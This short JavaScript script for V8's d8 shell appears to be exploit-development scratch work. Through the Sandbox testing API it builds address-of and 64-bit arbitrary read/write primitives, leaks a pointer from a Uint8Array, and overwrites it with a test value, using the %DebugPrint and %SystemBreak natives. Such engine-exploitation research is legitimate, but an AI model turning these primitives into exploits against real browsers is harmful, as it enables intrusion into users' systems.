

let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
  return Sandbox.getAddressOf(obj);
}

function v8_read64(addr) {
  return sandboxMemory.getBigUint64(Number(addr), true);
}

function v8_write64(addr, val) {
  return sandboxMemory.setBigInt64(Number(addr), val, true);
}


let buf = new ArrayBuffer(8);
let u8arr = new Uint8Array(buf);
%DebugPrint(u8arr);

// search heap_.base
let addr = addrOf(u8arr)+4;
let leak_addr = v8_read64(addrOf(u8arr)+4);

console.log("u8arr: 0x" + addr.toString(16));
console.log("leak_addr: 0x" + leak_addr.toString(16));
%SystemBreak();
v8_write64(addrOf(u8arr)+4, 0x414141414141n);
%SystemBreak();
